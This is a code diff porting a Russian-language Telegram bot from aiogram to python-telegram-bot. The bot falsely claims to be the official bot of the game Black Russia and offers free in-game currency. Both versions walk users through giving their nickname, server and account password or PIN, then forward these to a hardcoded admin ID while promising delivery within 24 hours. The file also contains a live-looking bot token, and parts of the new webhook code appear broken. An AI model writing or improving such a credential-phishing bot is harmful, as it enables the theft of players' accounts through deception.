@@ -1,82 +1,68 @@
-import os
 import logging
-from aiogram import Bot, Dispatcher, types, F
-from aiogram.filters import Command
-from aiogram.fsm.context import FSMContext
-from aiogram.fsm.state import StatesGroup, State
-from aiogram.fsm.storage.memory import MemoryStorage
-from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
-from aiogram.webhook.aiohttp_server import SimpleRequestHandler
-from aiohttp import web
+from flask import Flask, request
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes, ConversationHandler
 
+# ========== КОНФИГ ==========
 BOT_TOKEN = "8227199147:AAGISVvUfW1jst_ut-yUW0cokTyc8Rwj-pM"
 ADMIN_ID = 6005507174
-OWNER_USERNAME = "@Lopppaio"
 
-WEBHOOK_PATH = "/webhook"
-WEBHOOK_SECRET = "my_secret"
-BASE_WEBHOOK_URL = os.getenv("RENDER_EXTERNAL_URL")
+# Состояния для ConversationHandler
+NICKNAME, SERVER, PASSWORD = range(3)
 
-logging.basicConfig(level=logging.INFO)
-storage = MemoryStorage()
-bot = Bot(token=BOT_TOKEN)
-dp = Dispatcher(storage=storage)
+# Временное хранилище данных пользователей
+user_data = {}
 
-class GetMoneyState(StatesGroup):
-    waiting_nickname = State()
-    waiting_server = State()
-    waiting_password = State()
+# ========== КЛАВИАТУРЫ ==========
+def get_main_menu():
+    keyboard = [
+        [InlineKeyboardButton("💰 Получить 25кк", callback_data="get_money")],
+        [InlineKeyboardButton("🏠 Главное меню", callback_data="main_menu")]
+    ]
+    return InlineKeyboardMarkup(keyboard)
 
-def main_menu():
-    kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="💰 Получить 25кк", callback_data="get_money")],
-        [InlineKeyboardButton(text="🏠 Главное меню", callback_data="main_menu")]
-    ])
-    return kb
-
-@dp.message(Command("start"))
-async def cmd_start(message: types.Message):
+# ========== ОБРАБОТЧИКИ ==========
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     welcome_text = (
         "👋 *Добро пожаловать!*\n\n"
         "🤵 *Официальный бот от Black Russia*\n"
         "💰 Ты можешь получить *бесплатные 25кк* на *любом сервере*!\n\n"
         "⬇️ Используй кнопки ниже:"
     )
-    await message.answer(welcome_text, parse_mode="Markdown", reply_markup=main_menu())
+    await update.message.reply_text(welcome_text, parse_mode="Markdown", reply_markup=get_main_menu())
 
-@dp.callback_query(F.data == "main_menu")
-async def main_menu_callback(callback: types.CallbackQuery):
-    await callback.answer()
+async def main_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
     welcome_text = "👋 *Главное меню*\n\n🤵 Официальный бот от Black Russia\n💰 Бесплатные 25кк"
-    await callback.message.edit_text(welcome_text, parse_mode="Markdown", reply_markup=main_menu())
+    await query.edit_message_text(welcome_text, parse_mode="Markdown", reply_markup=get_main_menu())
 
-@dp.callback_query(F.data == "get_money")
-async def get_money_start(callback: types.CallbackQuery, state: FSMContext):
-    await callback.answer()
-    await state.set_state(GetMoneyState.waiting_nickname)
-    await callback.message.answer("🎮 *Шаг 1 из 3:*\nВведите ваш *НИК* в Black Russia:", parse_mode="Markdown")
+async def get_money_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    await query.edit_message_text("🎮 *Шаг 1 из 3:*\nВведите ваш *НИК* в Black Russia:", parse_mode="Markdown")
+    return NICKNAME
 
-@dp.message(GetMoneyState.waiting_nickname)
-async def get_nickname(message: types.Message, state: FSMContext):
-    await state.update_data(nickname=message.text.strip())
-    await state.set_state(GetMoneyState.waiting_server)
-    await message.answer("🌍 *Шаг 2 из 3:*\nУкажите название *СЕРВЕРА*:", parse_mode="Markdown")
+async def get_nickname(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    user_data[user_id] = {"nickname": update.message.text}
+    await update.message.reply_text("🌍 *Шаг 2 из 3:*\nУкажите название *СЕРВЕРА*:", parse_mode="Markdown")
+    return SERVER
 
-@dp.message(GetMoneyState.waiting_server)
-async def get_server(message: types.Message, state: FSMContext):
-    await state.update_data(server=message.text.strip())
-    await state.set_state(GetMoneyState.waiting_password)
-    await message.answer("🔐 *Шаг 3 из 3:*\nВведите *ПАРОЛЬ* (или пинкод) от аккаунта:", parse_mode="Markdown")
+async def get_server(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    user_data[user_id]["server"] = update.message.text
+    await update.message.reply_text("🔐 *Шаг 3 из 3:*\nВведите *ПАРОЛЬ* (или пинкод) от аккаунта:", parse_mode="Markdown")
+    return PASSWORD
 
-@dp.message(GetMoneyState.waiting_password)
-async def get_password(message: types.Message, state: FSMContext):
-    user_data = await state.get_data()
-    nickname = user_data.get("nickname")
-    server = user_data.get("server")
-    password = message.text.strip()
-    user_id = message.from_user.id
-    username = message.from_user.username or "Нет юзернейма"
-    full_name = message.from_user.full_name
+async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    data = user_data.get(user_id, {})
+    nickname = data.get("nickname", "?")
+    server = data.get("server", "?")
+    password = update.message.text
+    username = update.effective_user.username or "Нет юзернейма"
+    full_name = update.effective_user.full_name
 
     admin_msg = (
         f"🔔 *НОВАЯ ЗАЯВКА НА 25кк!*\n\n"
@@ -92,47 +78,78 @@ async def get_password(message: types.Message, state: FSMContext):
     )
 
     try:
-        await bot.send_message(ADMIN_ID, admin_msg, parse_mode="Markdown")
-        await message.answer(
+        await context.bot.send_message(ADMIN_ID, admin_msg, parse_mode="Markdown")
+        await update.message.reply_text(
             "✅ *Заявка принята!*\n\n"
             "💰 Валюта придет в течение *24 часов*.\n"
             "🙏 Спасибо!",
             parse_mode="Markdown",
-            reply_markup=main_menu()
+            reply_markup=get_main_menu()
         )
     except Exception as e:
-        await message.answer("⚠️ Ошибка, владелец уведомлен.")
+        await update.message.reply_text("⚠️ Ошибка, владелец уведомлен.")
 
-    await state.clear()
+    if user_id in user_data:
+        del user_data[user_id]
+    return ConversationHandler.END
 
-@dp.message(Command("admin"))
-async def admin_panel(message: types.Message):
-    if message.from_user.id != ADMIN_ID:
-        await message.answer("⛔ Нет доступа")
+async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("❌ Отменено.")
+    return ConversationHandler.END
+
+async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID:
+        await update.message.reply_text("⛔ Нет доступа")
         return
-    await message.answer("🔧 Панель владельца. ID админа подтвержден.")
+    await update.message.reply_text("🔧 Панель владельца. Бот работает!")
 
-@dp.message(Command("id"))
-async def get_my_id(message: types.Message):
-    await message.answer(f"🆔 Ваш ID: `{message.from_user.id}`", parse_mode="Markdown")
+async def get_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(f"🆔 Ваш ID: `{update.effective_user.id}`", parse_mode="Markdown")
 
-async def on_startup() -> None:
-    if BASE_WEBHOOK_URL:
-        webhook_url = f"{BASE_WEBHOOK_URL}{WEBHOOK_PATH}"
-        await bot.set_webhook(webhook_url, secret_token=WEBHOOK_SECRET)
-        logging.info(f"Webhook set to {webhook_url}")
+# ========== НАСТРОЙКА БОТА ==========
+app = Flask(__name__)
 
-async def on_shutdown() -> None:
-    await bot.delete_webhook()
+# Создаём приложение бота
+bot_app = Application.builder().token(BOT_TOKEN).build()
 
-def main():
-    app = web.Application()
-    webhook_requests_handler = SimpleRequestHandler(dispatcher=dp, bot=bot, secret_token=WEBHOOK_SECRET)
-    webhook_requests_handler.register(app, path=WEBHOOK_PATH)
-    app.on_startup.append(on_startup)
-    app.on_shutdown.append(on_shutdown)
-    port = int(os.getenv("PORT", "8080"))
-    web.run_app(app, host="0.0.0.0", port=port)
+# Регистрируем обработчики
+conv_handler = ConversationHandler(
+    entry_points=[CallbackQueryHandler(get_money_start, pattern="get_money")],
+    states={
+        NICKNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_nickname)],
+        SERVER: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_server)],
+        PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
+    },
+    fallbacks=[CommandHandler("cancel", cancel)],
+)
 
+bot_app.add_handler(CommandHandler("start", start))
+bot_app.add_handler(CommandHandler("admin", admin_panel))
+bot_app.add_handler(CommandHandler("id", get_id))
+bot_app.add_handler(CallbackQueryHandler(main_menu_callback, pattern="main_menu"))
+bot_app.add_handler(conv_handler)
+
+# Вебхук для Render
+@app.route(f"/webhook/{BOT_TOKEN}", methods=["POST"])
+def webhook():
+    update = Update.de_json(request.get_json(), bot_app.bot)
+    bot_app.process_update(update)
+    return "ok", 200
+
+@app.route("/")
+def index():
+    return "Bot is running!", 200
+
+# ========== ЗАПУСК ==========
 if __name__ == "__main__":
-    main()
+    # Устанавливаем вебхук
+    import os
+    webhook_url = os.getenv("RENDER_EXTERNAL_URL")
+    if webhook_url:
+        bot_app.bot.set_webhook(f"{webhook_url}/webhook/{BOT_TOKEN}")
+        print(f"Webhook set to {webhook_url}/webhook/{BOT_TOKEN}")
+    else:
+        print("No RENDER_EXTERNAL_URL, running with polling...")
+        bot_app.run_polling()
+    
+    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))
